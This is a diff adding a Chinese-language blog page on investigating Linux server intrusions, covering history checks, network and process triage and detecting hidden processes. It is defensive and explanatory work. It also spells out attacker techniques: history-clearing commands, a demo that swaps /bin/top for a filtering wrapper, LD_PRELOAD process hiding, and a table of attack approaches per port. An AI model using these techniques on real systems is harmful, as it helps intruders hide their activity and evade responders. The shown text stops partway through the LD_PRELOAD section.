@@ -1,0 +1,1093 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>Linux 入侵排查</title>
+<meta name="keywords" content="Linux 入侵排查, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="0、应急响应流程当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="Linux 入侵排查">
+<meta property="og:description" content="0、应急响应流程当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    
+    
+    <div class="site-marquee" aria-hidden="true">
+      <span class="site-marquee-text" style="animation-duration: 14s; color: #9a6b1f;">
+        <i class="site-marquee-dot" style="background: #9a6b1f;"></i>写点东西，保持思考 · 安全学习之路
+      </span>
+    </div>
+    
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+      <a class="menu" href="/">
+        首页
+      </a>
+    
+  
+      <a class="menu" href="/tags/">
+        标签
+      </a>
+    
+  
+      <a class="menu" href="/categories/">
+        分类
+      </a>
+    
+  
+      <a class="menu" href="/archives/">
+        归档
+      </a>
+    
+  
+      <a class="menu" href="/about/">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">Linux 入侵排查</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2025-11-05</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/Linux/">
+              Linux
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+              应急响应
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h2 id="0、应急响应流程"><a href="#0、应急响应流程" class="headerlink" title="0、应急响应流程"></a>0、应急响应流程</h2><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
+<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p>
+<p><strong>排查主流程：</strong></p>
+<ol>
+<li>摸现状：系统信息、时间、历史命令</li>
+<li>查网络与进程：连接、端口、进程及隐藏手法</li>
+<li>查账号与访问后门：用户权限、SSH 公钥后门</li>
+<li>查持久化：开机启动项、计划任务、服务、shell 启动文件</li>
+<li>查文件与命令完整性：可疑文件、命令替换、SUID</li>
+<li>日志分析与时间线：secure、journald、auditd、rsyslog</li>
+</ol>
+<p><strong>现场保护与取证顺序：</strong></p>
+<p>先隔离再取证（断网&#x2F;快照&#x2F;保留现场），取证按易失性顺序：<mark>内存 → 网络连接 → 进程&#x2F;会话 → 磁盘文件</mark>。失陷机上先采集、后处置，别急着 <mark>kill 进程或跑全盘扫描</mark>，避免破坏证据。</p>
+<p><strong>处置要点：</strong></p>
+<p><mark>清除后门后要复查一遍全部持久化点，防止清了又起来</mark>；取证材料先留存再处置。</p>
+<h2 id="一、摸现状：系统与历史"><a href="#一、摸现状：系统与历史" class="headerlink" title="一、摸现状：系统与历史"></a>一、摸现状：系统与历史</h2><h3 id="1-1-系统信息与时间"><a href="#1-1-系统信息与时间" class="headerlink" title="1.1 系统信息与时间"></a>1.1 系统信息与时间</h3><p><strong>内核信息：</strong></p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uname -a     # 内核版本等全部信息</span><br><span class="line">uname -r     # 内核版本</span><br><span class="line">uname -n     # 主机名</span><br><span class="line">uname -m     # 系统架构</span><br><span class="line"></span><br><span class="line">cat /proc/version    # 内核信息</span><br><span class="line">cat /proc/cpuinfo    # CPU 信息</span><br><span class="line">cat /etc/*-release   # 发行版信息</span><br><span class="line">cat /etc/issue       # 发行版信息</span><br></pre></td></tr></table></div></figure>
+
+<p>先确认内核版本，为下一步提权漏洞推论做铺垫——如果存在相关提权漏洞，一定和操作系统内核有关系。</p>
+<p>uname -a 输出解析：<code>3.10.0-693.el7.x86_64</code> 中 3.10.0 是内核版本、el7 是发行版（RHEL&#x2F;CentOS 7）、x86_64 是架构。<mark>提权漏洞几乎都跟着内核版本走</mark>（如 DirtyCow CVE-2016-5195、DirtyPipe CVE-2022-0847），对照内核版本即可快速判断有没有已知提权 EXP 可用。</p>
+<p>&#x2F;proc&#x2F;version 显示的是内核信息，&#x2F;etc&#x2F;*-release 显示的是发行版信息，两者用途不同。</p>
+<p><strong>系统时间确认：</strong></p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date        # 当前时间</span><br><span class="line">uptime      # 运行时长、登录用户数、负载</span><br></pre></td></tr></table></div></figure>
+
+<p>注意时区：EDT（美国东部夏令时，UT-4）比 CST（中国标准时间，UT+8）晚 12 小时。系统时间和本地时间不匹配时，<mark>后续系统日志、应用日志的时间都要重新换算</mark>。</p>
+<p>换算例子：日志里的 07:00 EDT（UTC-4）&#x3D; 北京时间 19:00（UTC+8）。如果系统时区异常或日志时间对不上，先看 &#x2F;etc&#x2F;localtime 和 <code>timedatectl</code>，攻击者可能用 date -s 改过时间伪造日志。</p>
+<h3 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h3><p><strong>基本使用：</strong></p>
+<p>Linux 系统里，执行过命令的用户会在自己家目录下生成相应的历史记录文件</p>
+<p>如：.bash_history、.zsh_history、.sh_history</p>
+<p>打开各账户目录下的 .bash_history、.zsh_history、.sh_history，查看账户历史命令</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.*_history | more</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /home/*/.*_history | more</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p>通过 .bash_history 文件查看帐号执行过的系统命令</p>
+<ul>
+<li>1、root 用户的历史命令</li>
+</ul>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span></span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>2、打开 &#x2F;home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。<br>为历史的命令增加登录的 IP 地址、执行命令时间等信息：</li>
+</ul>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class="line">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3）source /etc/profile 让配置生效</span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>3、历史操作命令的清除：</li>
+</ul>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"></span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_history 文件中的记录。</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>入侵排查：</strong></p>
+<p>攻击者清理历史的手法（排查时注意）：</p>
+<ul>
+<li><code>unset HISTORY</code> &#x2F; <code>export HISTSIZE=0</code>：本次会话不记录</li>
+<li><code>ln -s /dev/null ~/.bash_history</code>：历史文件指向空设备</li>
+<li><code>history -c</code> 后正常退出：只清内存缓存，文件里的旧记录还在</li>
+</ul>
+<p>排查时如果某用户的 .bash_history 是符号链接指向 &#x2F;dev&#x2F;null，或者干脆不存在（正常使用都会生成），<mark>基本可以判定被清理过</mark>。</p>
+<p>导出历史命令：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下，导出历史命令。</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>主要分析是否有账户执行过恶意操作</li>
+<li>当安全事件发生的时候，可以通过查看每个用户所执行过的历史命令，来分析该用户是否有执行恶意命令，如果发现哪一个用户执行过恶意命令，就可以锁定线索做下一步排查。</li>
+</ul>
+<h2 id="二、网络与进程排查"><a href="#二、网络与进程排查" class="headerlink" title="二、网络与进程排查"></a>二、网络与进程排查</h2><h3 id="2-1-网络连接与端口"><a href="#2-1-网络连接与端口" class="headerlink" title="2.1 网络连接与端口"></a>2.1 网络连接与端口</h3><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">netstat -antulp | more</span><br><span class="line"></span><br><span class="line">a 所有状态连接</span><br><span class="line">n 十进制显示IPV4地址</span><br><span class="line">l 显示监听链接</span><br><span class="line">t 显示TCP连接</span><br><span class="line">u 显示UDP连接</span><br><span class="line">p 显示PID</span><br></pre></td></tr></table></div></figure>
+
+<p>TCP 状态快速判断：LISTEN 本地在监听、ESTABLISHED 已建立连接、SYN-SENT 正在主动外连（还没收到 ACK，可能是扫描器或回连失败）、TIME_WAIT 正常关闭后的残留。对外发起的 <mark>ESTABLISHED &#x2F; SYN-SENT 连接是重点</mark>。</p>
+<p>新系统推荐用 ss 替代 netstat：<code>ss -tulnp</code> 效果等同 netstat -antulp。</p>
+<p>补充判断：</p>
+<ul>
+<li><code>ss -tnp state established</code> 只看已建立的连接，重点盯非业务端口的外连</li>
+<li>DNS 隧道特征：<mark>大量大体积 TXT 查询、高频率随机子域名</mark>；ICMP 隧道：正常环境极少用 ICMP 传数据，出现异常 ping 流量要查</li>
+</ul>
+<p>发现可疑IP，上报或者威胁情报分析，确认后结束进程</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pstree  -asp PID号  <span class="comment">#查看是否有父进程</span></span><br><span class="line">lsof -p PID号    <span class="comment">#查看是否有父进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 PID</span><br></pre></td></tr></table></div></figure>
+
+<p>查看下 pid 所对应的进程文件路径，如果确认是病毒，及时上报进行留存与删除</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">file /proc/<span class="variable">$PID</span>/exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（<span class="variable">$PID</span> 为对应的 pid 号）</span><br></pre></td></tr></table></div></figure>
+
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/image-20250214133655291.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/image-20250214133655291.png"  alt="image-20250214133655291" lazyload></a></p>
+<p>网络信息排查：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ifconfig                <span class="comment"># 网络接口配置</span></span><br><span class="line">netstat -pantu          <span class="comment"># 当前端口开放情况</span></span><br><span class="line">netstat -an | grep tcp | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span>   <span class="comment"># 格式化输出 tcp 连接的目标 IP</span></span><br><span class="line">netstat -an | grep syn | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span>   <span class="comment"># 输出 syn 状态的目标 IP</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>风险端口列表（对照排查开放服务）：</strong></p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>渗透测试</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>tcp 20,21</td>
+<td>FTP</td>
+<td>允许匿名上传下载、爆破、嗅探、win 提权、远程执行（proftpd 1.3.5）、各类后门（proftpd、vsftp 2.3.4）</td>
+</tr>
+<tr>
+<td>tcp 22</td>
+<td>SSH</td>
+<td>爆破、v1 中间人、ssh 隧道及内网代理转发、文件传输</td>
+</tr>
+<tr>
+<td>tcp 23</td>
+<td>Telnet</td>
+<td>爆破、嗅探，常用于路由&#x2F;交换登录，可尝试弱口令</td>
+</tr>
+<tr>
+<td>tcp 25</td>
+<td>SMTP</td>
+<td>邮件伪造、vrfy&#x2F;expn 查询用户、smtp-user-enum 自动跑</td>
+</tr>
+<tr>
+<td>tcp&#x2F;udp 53</td>
+<td>DNS</td>
+<td>区域传送、dns 劫持、缓存投毒、欺骗、dns 隧道远控</td>
+</tr>
+<tr>
+<td>tcp&#x2F;udp 69</td>
+<td>TFTP</td>
+<td>下载目标各类重要配置文件</td>
+</tr>
+<tr>
+<td>tcp 80-89、443、8440-8450、8080-8089</td>
+<td>各种 Web 服务端口</td>
+<td>topn&#x2F;vpn&#x2F;owa&#x2F;webmail&#x2F;目标 oa&#x2F;Java 控制台&#x2F;Web 管理面板&#x2F;中间件漏洞&#x2F;框架漏洞</td>
+</tr>
+<tr>
+<td>tcp 110</td>
+<td>POP3</td>
+<td>爆破、嗅探</td>
+</tr>
+<tr>
+<td>tcp 111,2049</td>
+<td>NFS</td>
+<td>权限配置不当</td>
+</tr>
+<tr>
+<td>tcp 137,139,445</td>
+<td>SMB</td>
+<td>爆破、ms08-067、ms17-010、嗅探</td>
+</tr>
+<tr>
+<td>tcp 143</td>
+<td>IMAP</td>
+<td>爆破</td>
+</tr>
+<tr>
+<td>udp 161</td>
+<td>SNMP</td>
+<td>爆破默认团体字符串、搜集内网信息</td>
+</tr>
+<tr>
+<td>tcp 389</td>
+<td>LDAP</td>
+<td>ldap 注入、匿名访问、弱口令</td>
+</tr>
+<tr>
+<td>tcp 512,513,514</td>
+<td>Linux rexec</td>
+<td>爆破、rlogin 登录</td>
+</tr>
+<tr>
+<td>tcp 873</td>
+<td>Rsync</td>
+<td>匿名访问、文件上传</td>
+</tr>
+<tr>
+<td>tcp 1194</td>
+<td>OpenVPN</td>
+<td>钓 VPN 账号进内网</td>
+</tr>
+<tr>
+<td>tcp 1352</td>
+<td>Lotus</td>
+<td>弱口令、信息泄漏、爆破</td>
+</tr>
+<tr>
+<td>tcp 1433</td>
+<td>SQL Server</td>
+<td>注入、提权、sa 弱口令、爆破</td>
+</tr>
+<tr>
+<td>tcp 1521</td>
+<td>Oracle</td>
+<td>tns 爆破、注入、弹 shell</td>
+</tr>
+<tr>
+<td>tcp 1500</td>
+<td>ISPmanager</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 1723</td>
+<td>PPTP</td>
+<td>爆破、钓 VPN 账号进内网</td>
+</tr>
+<tr>
+<td>tcp 2082,2083</td>
+<td>cPanel</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 2181</td>
+<td>ZooKeeper</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>tcp 2601,2604</td>
+<td>Zebra</td>
+<td>默认密码 zebra</td>
+</tr>
+<tr>
+<td>tcp 3128</td>
+<td>Squid</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 3312,3311</td>
+<td>kangle</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 3306</td>
+<td>MySQL</td>
+<td>注入、提权、爆破</td>
+</tr>
+<tr>
+<td>tcp 3389</td>
+<td>Windows RDP</td>
+<td>shift 后门（03 以下）、爆破、ms12-020</td>
+</tr>
+<tr>
+<td>tcp 3690</td>
+<td>SVN</td>
+<td>svn 泄露、未授权访问</td>
+</tr>
+<tr>
+<td>tcp 4848</td>
+<td>GlassFish</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 5000</td>
+<td>Sybase&#x2F;DB2</td>
+<td>爆破、注入</td>
+</tr>
+<tr>
+<td>tcp 5432</td>
+<td>PostgreSQL</td>
+<td>爆破、注入、弱口令</td>
+</tr>
+<tr>
+<td>tcp 5900、5901、5902</td>
+<td>VNC</td>
+<td>弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 5984</td>
+<td>CouchDB</td>
+<td>未授权导致任意指令执行</td>
+</tr>
+<tr>
+<td>tcp 6379</td>
+<td>Redis</td>
+<td>未授权访问、弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 7001,7002</td>
+<td>WebLogic</td>
+<td>Java 反序列化、弱口令</td>
+</tr>
+<tr>
+<td>tcp 7778</td>
+<td>Kloxo</td>
+<td>主机面板登录</td>
+</tr>
+<tr>
+<td>tcp 8000</td>
+<td>Ajenti</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 8443</td>
+<td>Plesk</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td>tcp 8069</td>
+<td>Zabbix</td>
+<td>远程执行、SQL 注入</td>
+</tr>
+<tr>
+<td>tcp 8080-8089</td>
+<td>Jenkins&#x2F;JBoss</td>
+<td>反序列化、控制台弱口令</td>
+</tr>
+<tr>
+<td>tcp 9080-9081、9090</td>
+<td>WebSphere</td>
+<td>Java 反序列化&#x2F;弱口令</td>
+</tr>
+<tr>
+<td>tcp 9200,9300</td>
+<td>ElasticSearch</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td>tcp 11211</td>
+<td>Memcached</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>tcp 27017,27018</td>
+<td>MongoDB</td>
+<td>爆破、未授权访问</td>
+</tr>
+<tr>
+<td>tcp 50070,50030</td>
+<td>Hadoop</td>
+<td>默认端口未授权访问</td>
+</tr>
+</tbody></table></div>
+<h3 id="2-2-进程排查与隐藏手法"><a href="#2-2-进程排查与隐藏手法" class="headerlink" title="2.2 进程排查与隐藏手法"></a>2.2 进程排查与隐藏手法</h3><p>使用 ps 命令，分析进程</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></div></figure>
+
+<p>使用 top 分析（q 退出）</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>运行以上命令，如果发现有名称不断变化的非授权进程占用大量系统 CPU 或内存资源时，则可能为恶意程序</li>
+<li>确定该进程为恶意进程后，可以使用<code>kill -9 PID</code>  结束进程，或使用防火墙限制进程外联</li>
+</ul>
+<p>分析是否有父进程</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pstree  -asp PID号  <span class="comment">#查看是否有父进程</span></span><br><span class="line">lsof -p PID号    <span class="comment">#查看父进程</span></span><br></pre></td></tr></table></div></figure>
+
+
+<p>恶意木马执行后必然出现一个恶意进程，可通过四个特征判断：</p>
+<ol>
+<li>CPU、内存占用异常高</li>
+<li>运行时间、启动时间差异明显</li>
+<li>进程路径、启动命令参数异常</li>
+<li>多数病毒会替换系统命令</li>
+</ol>
+<p>进程信息获取：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">top -c                          <span class="comment"># 快速看进程和 CPU 占用</span></span><br><span class="line">ps -aux                         <span class="comment"># 查看进程关联</span></span><br><span class="line"><span class="built_in">cat</span> /proc/&lt;PID&gt;/maps            <span class="comment"># 查看 PID 关联的文件</span></span><br><span class="line">pstree                          <span class="comment"># 只看父子进程关系</span></span><br><span class="line">lsof -p &lt;pid&gt;                   <span class="comment"># 输出进程打开的文件（CentOS7 默认不装）</span></span><br></pre></td></tr></table></div></figure>
+
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/1595558005239-6f19b9bb-5ee2-459f-8a89-1870d4a699df.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/1595558005239-6f19b9bb-5ee2-459f-8a89-1870d4a699df.png"  alt="pstree 进程树" lazyload></a></p>
+<p>原理：&#x2F;proc 是虚拟文件系统，ps&#x2F;top 都是读取 &#x2F;proc&#x2F;<PID>&#x2F;stat、&#x2F;proc&#x2F;<PID>&#x2F;status、&#x2F;proc&#x2F;<PID>&#x2F;cmdline 来汇总进程信息。所以直接遍历 &#x2F;proc 目录（配合 stat&#x2F;readlink 看 cmdline、exe）可以绕过被 hook 过的 ps。</p>
+<p>快速排序找可疑进程：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -eo pid,ppid,lstart,cmd --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span>     <span class="comment"># 按 CPU 排序</span></span><br><span class="line">ps -eo pid,ppid,lstart,cmd --<span class="built_in">sort</span>=-%mem | <span class="built_in">head</span>     <span class="comment"># 按内存排序</span></span><br><span class="line">ps -p PID -o pid,lstart,cmd                        <span class="comment"># 看单个进程启动时间</span></span><br></pre></td></tr></table></div></figure>
+
+<p>重点核对：进程启动时间是否在事发时间附近、父进程（ppid）是否正常、cmd 路径是否存在且合理。</p>
+<p>补充排查点：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsof +L1                                  <span class="comment"># 被删除但仍被占用的文件（rootkit/自删木马特征）</span></span><br><span class="line">ps aux | awk <span class="string">&#x27;$8 ~ /D/&#x27;</span>                   <span class="comment"># D 状态（不可中断）进程，常见于挖矿/rootkit</span></span><br><span class="line"><span class="built_in">cat</span> /proc/&lt;PID&gt;/environ | <span class="built_in">tr</span> <span class="string">&#x27;\0&#x27;</span> <span class="string">&#x27;\n&#x27;</span>    <span class="comment"># 进程环境变量，看有没有 LD_PRELOAD 注入</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>进程隐藏手法与排查（攻击者怎么藏，我们怎么找）：</strong></p>
+<p>1、偷梁换柱（替换命令）</p>
+<p>原理：不藏进程本身，而是替换 top&#x2F;ps&#x2F;lsof 这类查看命令，让命令在输出正常内容的同时过滤掉恶意进程。这种手法安全防护人员也会用，比如隐藏蜜罐里的监控进程，不让入侵者察觉。</p>
+<p>实验思路（攻击者复现）：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /bin/top /root/python_to_ping/top        <span class="comment"># 把正常 top 移到隐蔽路径</span></span><br><span class="line">vim /bin/top                                 <span class="comment"># 在原位置放同名脚本</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/root/python_to_ping/top | grep -v python   <span class="comment"># 调真 top，再过滤掉恶意进程</span></span><br><span class="line"><span class="built_in">chmod</span> +x /bin/top                            <span class="comment"># 脚本需要可执行权限</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查思路：</p>
+<ul>
+<li>stat &#x2F;bin&#x2F;ps、&#x2F;bin&#x2F;top 等命令文件，看 mtime 是否在事发时间附近（正常系统 &#x2F;bin 下的 mtime 通常很旧）</li>
+<li>find &#x2F;bin&#x2F; &#x2F;sbin&#x2F; -mtime 0 查一天内被修改的命令文件</li>
+<li>md5sum &#x2F;bin&#x2F;ps 与同版本干净系统对比，不一致就是被替换</li>
+<li>更彻底：rpm -Va 校验所有 rpm 包文件完整性（见 7.1 工具篇）</li>
+</ul>
+<p>2、Hook 系统调用（LD_PRELOAD）</p>
+<p>原理：&#x2F;proc 是一个虚拟文件系统，是 VFS（虚拟文件系统）的一个实现形式，里面包含内核信息、硬件信息、进程信息。ps&#x2F;top 这类工具并不是直接查进程表，而是通过分析 &#x2F;proc 文件系统中进程相关目录来获取进程信息。</p>
+<p>ps 的工作流程：先调用 openat 系统函数拿到 &#x2F;proc 目录的文件句柄 → 调用 getdents 系统函数递归获取 &#x2F;proc 下所有文件信息（包括子目录）→ 再调用 open 打开 &#x2F;proc&#x2F;<PID>&#x2F;stat、&#x2F;proc&#x2F;<PID>&#x2F;status、&#x2F;proc&#x2F;<PID>&#x2F;cmdline 等文件获取进程信息 → 最后整理打印。</p>
+<p>Hook 的原理：这种隐藏方式是拦截或迷惑 ps 等工具从 &#x2F;proc 获取分析结果的过程，而不是修改 &#x2F;proc 文件系统本身。比起劫持修改 getdents 之类的函数，更简单的是利用环境变量 LD_PRELOAD 或配置 &#x2F;etc&#x2F;ld.so.preload 文件，让恶意动态库先于系统标准库加载，最终实现对特定进程的隐藏。</p>
+<p>实验思路：</p>
